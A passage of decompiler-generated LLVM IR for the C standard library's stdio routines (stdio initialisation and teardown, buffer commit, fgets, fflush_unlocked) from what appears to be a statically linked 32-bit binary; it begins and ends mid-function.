  uselistorder i32 %v1_804ca4a, { 1, 0, 2 }
  uselistorder i32 %v1_804ca0b, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804c9fa, { 1, 0 }
  uselistorder i32 %v0_804c9cd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 4096, { 7, 4, 5, 0, 1, 8, 9, 2, 6, 3 }
  uselistorder i32 (i8*, i32, i32)* @__libc_open, { 1, 0, 2 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_804cbb1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804cbaa, { 1, 0 }
  uselistorder label %dec_label_pc_804cb1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ca8b, { 1, 0 }
  uselistorder label %dec_label_pc_804ca7b, { 1, 0 }
  uselistorder label %dec_label_pc_804ca38, { 1, 0 }
  uselistorder label %dec_label_pc_804ca02, { 1, 0 }
  uselistorder label %dec_label_pc_804c9f4, { 1, 0 }
  uselistorder label %dec_label_pc_804c9e9, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cbbd = load i32, i32* @edi, align 4
  %v0_804cbbe = load i32, i32* @esi, align 4
  %v0_804cbbf = load i32, i32* @ebx, align 4
  store i32 %v0_804cbbf, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804cbc8 = call i32 @__errno_location(i32 %v0_804cbbf)
  store i32 %v1_804cbc8, i32* @edi, align 4
  %v0_804cbd2 = load i32, i32* @global_var_80521e0.103, align 32
  store i32 %v0_804cbd2, i32* @esi, align 4
  %v1_804cbd8 = inttoptr i32 %v1_804cbc8 to i32*
  %v2_804cbd8 = load i32, i32* %v1_804cbd8, align 4
  store i32 %v2_804cbd8, i32* %ebp.global-to-local, align 4
  %v1_804cbdc = call i32 @isatty(i32 0)
  %v0_804cbe1 = load i32, i32* @ebx, align 4
  %v2_804cbe3 = sub i32 %v0_804cbe1, %v1_804cbdc
  %v2_804cbee = mul i32 %v2_804cbe3, 256
  %v0_804cbf1 = load i32, i32* @esi, align 4
  %v2_804cbf1 = xor i32 %v0_804cbf1, %v2_804cbee
  %v1_804cbf3 = trunc i32 %v2_804cbf1 to i16
  store i16 %v1_804cbf3, i16* bitcast (i32* @global_var_80521e0.103 to i16*), align 32
  %v0_804cbfa = load i32, i32* @global_var_8052230.105, align 16
  store i32 %v0_804cbfa, i32* @esi, align 4
  %v1_804cc00 = call i32 @isatty(i32 1)
  %v0_804cc05 = load i32, i32* @ebx, align 4
  %v2_804cc05 = sub i32 %v0_804cc05, %v1_804cc00
  %v2_804cc07 = mul i32 %v2_804cc05, 256
  %v0_804cc0a = load i32, i32* @esi, align 4
  %v2_804cc0a = xor i32 %v2_804cc07, %v0_804cc0a
  %v1_804cc0c = trunc i32 %v2_804cc0a to i16
  store i16 %v1_804cc0c, i16* bitcast (i32* @global_var_8052230.105 to i16*), align 16
  %v0_804cc13 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cc13 = load i32, i32* @edi, align 4
  %v2_804cc13 = inttoptr i32 %v1_804cc13 to i32*
  store i32 %v0_804cc13, i32* %v2_804cc13, align 4
  %v2_804cc18 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cc18, i32* @ebx, align 4
  store i32 %v0_804cbbe, i32* @esi, align 4
  store i32 %v0_804cbbd, i32* @edi, align 4
  ret i32 %v1_804cc00

; uselistorder directives
  uselistorder i32 %v1_804cbc8, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804cc2b = inttoptr i32 %arg1 to i16*
  %v4_804cc2b = call i32 @memcpy(i16* %v3_804cc2b, i32 ptrtoint (i32* @global_var_8050610.106 to i32), i32 24)
  ret i32 %v4_804cc2b
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804cc34 = load i32, i32* @esi, align 4
  %v0_804cc35 = load i32, i32* @ebx, align 4
  store i32 %v0_804cc35, i32* %stack_var_-8, align 4
  %v1_804cc3e = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  store i32 %v1_804cc3e, i32* %eax.global-to-local, align 4
  %v1_804cc4a = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 %v1_804cc4a, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804cc9422 = icmp eq i32 %storemerge21, 0
  %v1_804cc9623 = icmp eq i1 %v1_804cc9422, false
  br i1 %v1_804cc9623, label %dec_label_pc_804cc57.lr.ph, label %dec_label_pc_804ccb4.preheader

dec_label_pc_804cc57.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804cc57

dec_label_pc_804cc57:                             ; preds = %dec_label_pc_804cc57.lr.ph, %dec_label_pc_804cc7e
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804cc57.lr.ph ], [ %storemerge, %dec_label_pc_804cc7e ]
  %v1_804cc5a = add i32 %storemerge24, 56
  store i32 %v1_804cc5a, i32* @esi, align 4
  %v1_804cc5e = call i32 @__pthread_return_0(i32 %v1_804cc5a)
  store i32 %v1_804cc5e, i32* %eax.global-to-local, align 4
  %v1_804cc66 = icmp eq i32 %v1_804cc5e, 0
  br i1 %v1_804cc66, label %dec_label_pc_804cc7e, label %dec_label_pc_804cc6a

dec_label_pc_804cc6a:                             ; preds = %dec_label_pc_804cc57
  %v0_804cc6a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cc6a = add i32 %v0_804cc6a, 8
  %v2_804cc6a = inttoptr i32 %v1_804cc6a to i32*
  %v3_804cc6a = load i32, i32* %v2_804cc6a, align 4
  store i32 %v3_804cc6a, i32* %eax.global-to-local, align 4
  %v1_804cc6d = inttoptr i32 %v0_804cc6a to i16*
  store i16 48, i16* %v1_804cc6d, align 2
  %v0_804cc72 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc72 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cc72 = add i32 %v1_804cc72, 24
  %v3_804cc72 = inttoptr i32 %v2_804cc72 to i32*
  store i32 %v0_804cc72, i32* %v3_804cc72, align 4
  %v0_804cc75 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc75 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cc75 = add i32 %v1_804cc75, 28
  %v3_804cc75 = inttoptr i32 %v2_804cc75 to i32*
  store i32 %v0_804cc75, i32* %v3_804cc75, align 4
  %v0_804cc78 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc78 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cc78 = add i32 %v1_804cc78, 16
  %v3_804cc78 = inttoptr i32 %v2_804cc78 to i32*
  store i32 %v0_804cc78, i32* %v3_804cc78, align 4
  %v0_804cc7b = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc7b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cc7b = add i32 %v1_804cc7b, 20
  %v3_804cc7b = inttoptr i32 %v2_804cc7b to i32*
  store i32 %v0_804cc7b, i32* %v3_804cc7b, align 4
  br label %dec_label_pc_804cc7e

dec_label_pc_804cc7e:                             ; preds = %dec_label_pc_804cc57, %dec_label_pc_804cc6a
  %v0_804cc81 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cc81 = add i32 %v0_804cc81, 52
  %v2_804cc81 = inttoptr i32 %v1_804cc81 to i32*
  store i32 1, i32* %v2_804cc81, align 4
  %v0_804cc88 = load i32, i32* @esi, align 4
  %v1_804cc89 = call i32 @__stdio_init_mutex(i32 %v0_804cc88)
  store i32 %v1_804cc89, i32* %eax.global-to-local, align 4
  %v0_804cc8e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cc8e = add i32 %v0_804cc8e, 32
  %v2_804cc8e = inttoptr i32 %v1_804cc8e to i32*
  %storemerge = load i32, i32* %v2_804cc8e, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804cc94 = icmp eq i32 %storemerge, 0
  %v1_804cc96 = icmp eq i1 %v1_804cc94, false
  br i1 %v1_804cc96, label %dec_label_pc_804cc57, label %dec_label_pc_804cc91.dec_label_pc_804ccb4.preheader_crit_edge

dec_label_pc_804cc91.dec_label_pc_804ccb4.preheader_crit_edge: ; preds = %dec_label_pc_804cc7e
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  br label %dec_label_pc_804ccb4.preheader

dec_label_pc_804ccb4.preheader:                   ; preds = %dec_label_pc_804cc91.dec_label_pc_804ccb4.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804cc91.dec_label_pc_804ccb4.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804ccb43 = icmp eq i32 %storemerge12, 0
  %v1_804ccb610 = icmp eq i1 %v1_804ccb43, false
  br i1 %v1_804ccb610, label %dec_label_pc_804cca0.preheader, label %dec_label_pc_804ccb8

dec_label_pc_804cca0.preheader:                   ; preds = %dec_label_pc_804ccb4.preheader
  br label %dec_label_pc_804cca0

dec_label_pc_804cca0:                             ; preds = %dec_label_pc_804cca0.preheader, %dec_label_pc_804ccb1
  %v0_804cca8 = phi i32 [ %storemerge1, %dec_label_pc_804ccb1 ], [ %storemerge12, %dec_label_pc_804cca0.preheader ]
  %v1_804cca0 = inttoptr i32 %v0_804cca8 to i8*
  %v2_804cca0 = load i8, i8* %v1_804cca0, align 1
  %v3_804cca0 = and i8 %v2_804cca0, 64
  %v4_804cca0 = icmp eq i8 %v3_804cca0, 0
  br i1 %v4_804cca0, label %dec_label_pc_804ccb1, label %dec_label_pc_804cca5

dec_label_pc_804cca5:                             ; preds = %dec_label_pc_804cca0
  %v1_804cca9 = call i32 @__stdio_wcommit(i32 %v0_804cca8)
  store i32 %v1_804cca9, i32* %eax.global-to-local, align 4
  %v0_804ccb1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ccb1

dec_label_pc_804ccb1:                             ; preds = %dec_label_pc_804cca0, %dec_label_pc_804cca5
  %v0_804ccb1 = phi i32 [ %v0_804cca8, %dec_label_pc_804cca0 ], [ %v0_804ccb1.pre, %dec_label_pc_804cca5 ]
  %v1_804ccb1 = add i32 %v0_804ccb1, 32
  %v2_804ccb1 = inttoptr i32 %v1_804ccb1 to i32*
  %storemerge1 = load i32, i32* %v2_804ccb1, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804ccb4 = icmp eq i32 %storemerge1, 0
  %v1_804ccb6 = icmp eq i1 %v1_804ccb4, false
  br i1 %v1_804ccb6, label %dec_label_pc_804cca0, label %dec_label_pc_804ccb8

dec_label_pc_804ccb8:                             ; preds = %dec_label_pc_804ccb1, %dec_label_pc_804ccb4.preheader
  %v2_804ccb8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ccb8, i32* %eax.global-to-local, align 4
  %v2_804ccb9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ccb9, i32* @ebx, align 4
  store i32 %v0_804cc34, i32* @esi, align 4
  ret i32 %v2_804ccb8

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_804ccb1, { 1, 0 }
  uselistorder label %dec_label_pc_804cca0, { 1, 0 }
  uselistorder label %dec_label_pc_804cc7e, { 1, 0 }
  uselistorder label %dec_label_pc_804cc57, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804ccbc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804ccc4 = add i32 %arg1, 8
  %v2_804ccc4 = inttoptr i32 %v1_804ccc4 to i32*
  %v3_804ccc4 = load i32, i32* %v2_804ccc4, align 4
  store i32 %v3_804ccc4, i32* %edx.global-to-local, align 4
  %v1_804ccc7 = add i32 %arg1, 16
  %v2_804ccc7 = inttoptr i32 %v1_804ccc7 to i32*
  %v3_804ccc7 = load i32, i32* %v2_804ccc7, align 4
  %v2_804ccca = sub i32 %v3_804ccc7, %v3_804ccc4
  %v12_804ccca = icmp eq i32 %v2_804ccca, 0
  store i32 %v2_804ccca, i32* %eax.global-to-local, align 4
  br i1 %v12_804ccca, label %dec_label_pc_804ccdd, label %dec_label_pc_804ccce

dec_label_pc_804ccce:                             ; preds = %entry
  store i32 %v3_804ccc4, i32* %v2_804ccc7, align 4
  %v0_804ccd1 = load i32, i32* @ecx, align 4
  %v0_804ccd2 = load i32, i32* %eax.global-to-local, align 4
  %v0_804ccd3 = load i32, i32* %edx.global-to-local, align 4
  %v0_804ccd4 = load i32, i32* @ebx, align 4
  %v4_804ccd5 = inttoptr i32 %v0_804ccd4 to i16*
  %v5_804ccd5 = call i32 @__stdio_WRITE(i16* %v4_804ccd5, i32 %v0_804ccd3, i32 %v0_804ccd2, i32 %v0_804ccd1)
  store i32 %v5_804ccd5, i32* %eax.global-to-local, align 4
  %v0_804ccdd.pre = load i32, i32* @ebx, align 4
  %v2_804cce3.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804ccdd

dec_label_pc_804ccdd:                             ; preds = %entry, %dec_label_pc_804ccce
  %v2_804cce3 = phi i32 [ %tmp11, %entry ], [ %v2_804cce3.pre, %dec_label_pc_804ccce ]
  %v0_804ccdd = phi i32 [ %arg1, %entry ], [ %v0_804ccdd.pre, %dec_label_pc_804ccce ]
  %v1_804ccdd = add i32 %v0_804ccdd, 16
  %v2_804ccdd = inttoptr i32 %v1_804ccdd to i32*
  %v3_804ccdd = load i32, i32* %v2_804ccdd, align 4
  store i32 %v3_804ccdd, i32* %eax.global-to-local, align 4
  %v2_804cce0 = add i32 %v0_804ccdd, 8
  %v3_804cce0 = inttoptr i32 %v2_804cce0 to i32*
  %v4_804cce0 = load i32, i32* %v3_804cce0, align 4
  %v5_804cce0 = sub i32 %v3_804ccdd, %v4_804cce0
  store i32 %v5_804cce0, i32* %eax.global-to-local, align 4
  store i32 %v2_804cce3, i32* @edx, align 4
  store i32 %v0_804ccbc, i32* @ebx, align 4
  ret i32 %v5_804cce0

; uselistorder directives
  uselistorder i32 %v0_804ccdd, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804ccdd, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cce8 = load i32, i32* @edi, align 4
  %v0_804cce9 = load i32, i32* @esi, align 4
  %v0_804ccea = load i32, i32* @ebx, align 4
  %v12_804cceb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804ccf2 = add i32 %arg3, 52
  %v2_804ccf2 = inttoptr i32 %v1_804ccf2 to i32*
  %v3_804ccf2 = load i32, i32* %v2_804ccf2, align 4
  store i32 %v3_804ccf2, i32* @edi, align 4
  %v1_804ccf5 = icmp eq i32 %v3_804ccf2, 0
  %v1_804ccf7 = icmp eq i1 %v1_804ccf5, false
  br i1 %v1_804ccf7, label %entry.dec_label_pc_804cd18_crit_edge, label %dec_label_pc_804ccf9

entry.dec_label_pc_804cd18_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804cd18

dec_label_pc_804ccf9:                             ; preds = %entry
  %v1_804ccf9 = add i32 %arg3, 56
  store i32 %v1_804ccf9, i32* @ebx, align 4
  store i32 %v12_804cceb, i32* @eax, align 4
  %v2_804cd08 = call i32 @__pthread_return_void(i32 %v12_804cceb, i32 134526403)
  %v0_804cd0d = load i32, i32* @ebx, align 4
  %v1_804cd10 = call i32 @__pthread_return_0(i32 %v0_804cd0d)
  %v0_804cd19.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cd18

dec_label_pc_804cd18:                             ; preds = %entry.dec_label_pc_804cd18_crit_edge, %dec_label_pc_804ccf9
  %v0_804cd19 = phi i32 [ %arg3, %entry.dec_label_pc_804cd18_crit_edge ], [ %v0_804cd19.pre, %dec_label_pc_804ccf9 ]
  %v0_804cd18 = load i32, i32* @edx, align 4
  %v4_804cd22 = inttoptr i32 %arg1 to i8*
  %v5_804cd22 = call i32 @__GI_fgets_unlocked(i8* %v4_804cd22, i32 %arg2, i32 %v0_804cd19, i32 %v0_804cd18)
  store i32 %v5_804cd22, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ccf7, label %dec_label_pc_804cd41, label %dec_label_pc_804cd30

dec_label_pc_804cd30:                             ; preds = %dec_label_pc_804cd18
  store i32 %v12_804cceb, i32* @eax, align 4
  %v2_804cd39 = call i32 @__pthread_return_void(i32 %v12_804cceb, i32 1)
  %v0_804cd44.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cd41

dec_label_pc_804cd41:                             ; preds = %dec_label_pc_804cd18, %dec_label_pc_804cd30
  %v0_804cd44 = phi i32 [ %v5_804cd22, %dec_label_pc_804cd18 ], [ %v0_804cd44.pre, %dec_label_pc_804cd30 ]
  store i32 %v0_804ccea, i32* @ebx, align 4
  store i32 %v0_804cce9, i32* @esi, align 4
  store i32 %v0_804cce8, i32* @edi, align 4
  ret i32 %v0_804cd44

; uselistorder directives
  uselistorder i32 %v12_804cceb, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804cd41, { 1, 0 }
  uselistorder label %dec_label_pc_804cd18, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804cd5b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cd5b, i32* @eax, align 4
  %v2_804cd60 = call i32 @__pthread_return_void(i32 %v2_804cd5b, i32 134526403)
  %v1_804cd6c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804cd71 = load i32, i32* @global_var_8052548.99, align 8
  %v8_804cd79 = icmp eq i32 %v0_804cd71, 1
  %v1_804cd7a = icmp eq i1 %v8_804cd79, false
  br i1 %v1_804cd7a, label %dec_label_pc_804ce11, label %dec_label_pc_804cd80

dec_label_pc_804cd80:                             ; preds = %entry
  %v0_804cd80 = load i32, i32* @global_var_805254c.100, align 4
  %tmp29 = icmp slt i32 %v0_804cd80, 1
  br i1 %tmp29, label %dec_label_pc_804ce11, label %dec_label_pc_804cd8d

dec_label_pc_804cd8d:                             ; preds = %dec_label_pc_804cd80
  store i32 0, i32* @esi, align 4
  %v2_804cd9a = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804cd9a, i32* @eax, align 4
  %v2_804cd9f = call i32 @__pthread_return_void(i32 %v2_804cd9a, i32 134526403)
  %v1_804cdab = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804cdb0 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cdb0, i32* %edx.global-to-local, align 4
  %v1_804cdf23 = icmp eq i32 %v0_804cdb0, 0
  %v1_804cdf410 = icmp eq i1 %v1_804cdf23, false
  br i1 %v1_804cdf410, label %dec_label_pc_804cdbb, label %dec_label_pc_804cdf6

dec_label_pc_804cdbb:                             ; preds = %dec_label_pc_804cd8d, %dec_label_pc_804cdf0
  %v0_804cdcb = phi i32 [ %v0_804cdf0, %dec_label_pc_804cdf0 ], [ %v0_804cdb0, %dec_label_pc_804cd8d ]
  %v1_804cdbb13 = inttoptr i32 %v0_804cdcb to i16*
  %v2_804cdbb = load i16, i16* %v1_804cdbb13, align 2
  %v1_804cdc3 = add i32 %v0_804cdcb, 32
  %v2_804cdc3 = inttoptr i32 %v1_804cdc3 to i32*
  %v3_804cdc3 = load i32, i32* %v2_804cdc3, align 4
  store i32 %v3_804cdc3, i32* @ebx, align 4
  %v1_804cdbe = and i16 %v2_804cdbb, -32720
  %v6_804cdc6 = icmp eq i16 %v1_804cdbe, 48
  br i1 %v6_804cdc6, label %dec_label_pc_804cdcf, label %dec_label_pc_804cdcb

dec_label_pc_804cdcb:                             ; preds = %dec_label_pc_804cdbb
  store i32 %v0_804cdcb, i32* @esi, align 4
  br label %dec_label_pc_804cdf0

dec_label_pc_804cdcf:                             ; preds = %dec_label_pc_804cdbb
  %v0_804cdcf = load i32, i32* @esi, align 4
  %v1_804cdcf = icmp eq i32 %v0_804cdcf, 0
  %v1_804cdd1 = icmp eq i1 %v1_804cdcf, false
  br i1 %v1_804cdd1, label %dec_label_pc_804cddb, label %dec_label_pc_804cdd3

dec_label_pc_804cdd3:                             ; preds = %dec_label_pc_804cdcf
  store i32 %v3_804cdc3, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  br label %dec_label_pc_804cdde

dec_label_pc_804cddb:                             ; preds = %dec_label_pc_804cdcf
  %v2_804cddb = add i32 %v0_804cdcf, 32
  %v3_804cddb = inttoptr i32 %v2_804cddb to i32*
  store i32 %v3_804cdc3, i32* %v3_804cddb, align 4
  %v0_804cdde.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cdde

dec_label_pc_804cdde:                             ; preds = %dec_label_pc_804cdd3, %dec_label_pc_804cddb
  %v0_804cde7 = phi i32 [ %v0_804cdcb, %dec_label_pc_804cdd3 ], [ %v0_804cdde.pre, %dec_label_pc_804cddb ]
  %v1_804cdde = add i32 %v0_804cde7, 1
  %v2_804cdde = inttoptr i32 %v1_804cdde to i8*
  %v3_804cdde = load i8, i8* %v2_804cdde, align 1
  %v4_804cdde = and i8 %v3_804cdde, 32
  %v5_804cdde = icmp eq i8 %v4_804cdde, 0
  br i1 %v5_804cdde, label %dec_label_pc_804cdf0, label %dec_label_pc_804cde4

dec_label_pc_804cde4:                             ; preds = %dec_label_pc_804cdde
  %v1_804cde8 = call i32 @free(i32 %v0_804cde7)
  br label %dec_label_pc_804cdf0

dec_label_pc_804cdf0:                             ; preds = %dec_label_pc_804cdde, %dec_label_pc_804cdcb, %dec_label_pc_804cde4
  %v0_804cdf0 = load i32, i32* @ebx, align 4
  store i32 %v0_804cdf0, i32* %edx.global-to-local, align 4
  %v1_804cdf2 = icmp eq i32 %v0_804cdf0, 0
  %v1_804cdf4 = icmp eq i1 %v1_804cdf2, false
  br i1 %v1_804cdf4, label %dec_label_pc_804cdbb, label %dec_label_pc_804cdf6

dec_label_pc_804cdf6:                             ; preds = %dec_label_pc_804cdf0, %dec_label_pc_804cd8d
  store i32 %v2_804cd9a, i32* @eax, align 4
  %v2_804cdff = call i32 @__pthread_return_void(i32 %v2_804cd9a, i32 1)
  store i32 0, i32* @global_var_805254c.100, align 4
  %v0_804ce11.pre = load i32, i32* @global_var_8052548.99, align 8
  br label %dec_label_pc_804ce11

dec_label_pc_804ce11:                             ; preds = %dec_label_pc_804cd80, %entry, %dec_label_pc_804cdf6
  %v0_804ce11 = phi i32 [ %v0_804cd71, %dec_label_pc_804cd80 ], [ %v0_804cd71, %entry ], [ %v0_804ce11.pre, %dec_label_pc_804cdf6 ]
  %v1_804ce16 = add i32 %v0_804ce11, -1
  store i32 %v1_804ce16, i32* @global_var_8052548.99, align 8
  store i32 %v2_804cd5b, i32* @eax, align 4
  %v2_804ce25 = call i32 @__pthread_return_void(i32 %v2_804cd5b, i32 1)
  ret i32 %v2_804ce25

; uselistorder directives
  uselistorder i32 %v0_804cdf0, { 1, 2, 0 }
  uselistorder i32 %v0_804cdcb, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804cd71, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 7, 6, 5, 4, 3, 20, 19, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ce11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cdf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cdde, { 1, 0 }
  uselistorder label %dec_label_pc_804cdbb, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804ce30 = load i32, i32* @ebp, align 4
  %v0_804ce31 = load i32, i32* @edi, align 4
  %v0_804ce32 = load i32, i32* @esi, align 4
  %v0_804ce33 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_804ce39 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ce39, i32* @ebx, align 4
  %v10_804ce3d = icmp eq i16* %arg1, inttoptr (i32 134553996 to i16*)
  br i1 %v10_804ce3d, label %dec_label_pc_804ce52, label %dec_label_pc_804ce45

dec_label_pc_804ce45:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_804ce4a = icmp eq i16* %arg1, null
  %v1_804ce4c = icmp eq i1 %v2_804ce4a, false
  br i1 %v1_804ce4c, label %dec_label_pc_804cf41, label %dec_label_pc_804ce52

dec_label_pc_804ce52:                             ; preds = %dec_label_pc_804ce45, %entry
  store i32 0, i32* @edi, align 4
  %v2_804ce5f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ce5f, i32* @ebx, align 4
  %v2_804ce64 = call i32 @__pthread_return_void(i32 %v2_804ce5f, i32 134526403)
  %v1_804ce70 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @ecx, align 4
  %v0_804ce76 = load i32, i32* @global_var_8052548.99, align 8
  %v1_804ce7c = add i32 %v0_804ce76, 1
  store i32 %v1_804ce7c, i32* @eax, align 4
  store i32 %v1_804ce7c, i32* @global_var_8052548.99, align 8
  %v2_804ce85 = call i32 @__pthread_return_void(i32 %v2_804ce5f, i32 1)
  store i32 %v2_804ce85, i32* @eax, align 4
  %v2_804ce98 = call i32 @__pthread_return_void(i32 %v2_804ce5f, i32 134526403)
  %v1_804cea4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  store i32 ptrtoint (i32* @global_var_8052190.102 to i32), i32* @eax, align 4
  %v0_804cead = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cead, i32* @esi, align 4
  %v2_804ceb4 = call i32 @__pthread_return_void(i32 %v2_804ce5f, i32 1)
  %v0_804cf361 = load i32, i32* @esi, align 4
  %v1_804cf362 = icmp eq i32 %v0_804cf361, 0
  %v1_804cf389 = icmp eq i1 %v1_804cf362, false
  br i1 %v1_804cf389, label %dec_label_pc_804cebe, label %dec_label_pc_804cf3a

dec_label_pc_804cebe:                             ; preds = %dec_label_pc_804ce52, %dec_label_pc_804cf33
  %v0_804cecc = phi i32 [ %v3_804cf33, %dec_label_pc_804cf33 ], [ %v0_804cf361, %dec_label_pc_804ce52 ]
  %v1_804cebe = inttoptr i32 %v0_804cecc to i8*
  %v2_804cebe = load i8, i8* %v1_804cebe, align 1
  %v3_804cebe = and i8 %v2_804cebe, 64
  %v4_804cebe = icmp eq i8 %v3_804cebe, 0
  br i1 %v4_804cebe, label %dec_label_pc_804cf33, label %dec_label_pc_804cec3

dec_label_pc_804cec3:                             ; preds = %dec_label_pc_804cebe
  %v0_804cec3 = load i32, i32* @global_var_80521c0.101, align 64
  %v9_804cec3 = icmp eq i32 %v0_804cec3, 2
  br i1 %v9_804cec3, label %dec_label_pc_804ceeb, label %dec_label_pc_804cecc

dec_label_pc_804cecc:                             ; preds = %dec_label_pc_804cec3
  %v1_804cecc = add i32 %v0_804cecc, 56
  store i32 %v1_804cecc, i32* @ebx, align 4
  store i32 %v2_804ce5f, i32* @eax, align 4
  %v2_804cedb = call i32 @__pthread_return_void(i32 %v2_804ce5f, i32 134526403)
  %v0_804cee0 = load i32, i32* @ebx, align 4
  %v1_804cee3 = call i32 @__pthread_return_0(i32 %v0_804cee0)
  %v1_804ceed.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ceeb

dec_label_pc_804ceeb:                             ; preds = %dec_label_pc_804cec3, %dec_label_pc_804cecc
